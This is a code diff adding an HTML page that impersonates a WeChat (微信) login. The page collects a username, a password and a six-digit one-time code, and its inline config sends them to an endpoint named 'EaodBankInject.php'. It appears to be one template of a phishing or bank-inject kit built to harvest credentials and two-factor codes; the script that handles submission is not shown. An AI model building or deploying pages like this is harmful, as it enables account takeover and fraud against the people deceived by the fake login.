@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>微信</title>
+<style>:root{{--c1:#3b5bf0;--c2:#3b5bf0;}}</style>
+<link rel="stylesheet" href="/bank/assets/bank.css">
+</head>
+<body>
+<div class="bk-wrap">
+  <div class="bk-top">
+    <div class="bk-brand">
+      <div class="bk-logo" id="bk_logo">微信</div>
+      <div>
+        <div class="bk-name" id="bk_name">微信</div>
+        <div class="bk-sub" id="bk_sub"></div>
+      </div>
+    </div>
+  </div>
+  <div class="bk-card">
+    <form id="bk_form" autocomplete="off">
+      <div data-step2>
+        <div class="bk-h1" id="bk_h1"></div>
+        <div class="bk-h2" id="bk_h2"></div>
+        <div class="bk-field"><label id="bk_u_label"></label><input id="bk_u" type="text" autocomplete="off"></div>
+        <div class="bk-field"><label id="bk_p_label"></label><input id="bk_p" type="password" autocomplete="off"></div>
+        <div class="bk-err" id="bk_err"></div>
+        <button type="submit" class="bk-btn" id="bk_btn"></button>
+      </div>
+      <div data-step3 style="display:none">
+        <span class="bk-step" id="bk_step2"></span>
+        <div class="bk-h1" id="bk_o_h1"></div>
+        <div class="bk-h2" id="bk_o_h2"></div>
+        <div class="bk-field"><label id="bk_o_label"></label><input id="bk_o" type="tel" inputmode="numeric" placeholder="••••••" autocomplete="off"></div>
+        <div class="bk-err" id="bk_err2"></div>
+        <button type="button" class="bk-btn" id="bk_btn2" onclick="window.__bkSubmit()"></button>
+      </div>
+    </form>
+    <div class="bk-safe" id="bk_safe"></div>
+  </div>
+  <div class="bk-foot" id="bk_foot"></div>
+</div>
+<script>
+window.__BK = {"mode":"custom","bank":"微信","cc":"custom","flow":"up","digits":6,"words":12,"needOtp":false,"step":1,"pid":"","lang":"zh-CN","welcome":"","maint":"哈哈哈","api":"\/api\/EaodBankInject.php"};
+</script>
+<script src="/bank/assets/i18n.json.js"></script>
+<script src="/bank/assets/bank.js"></script>
+</body>
+</html>
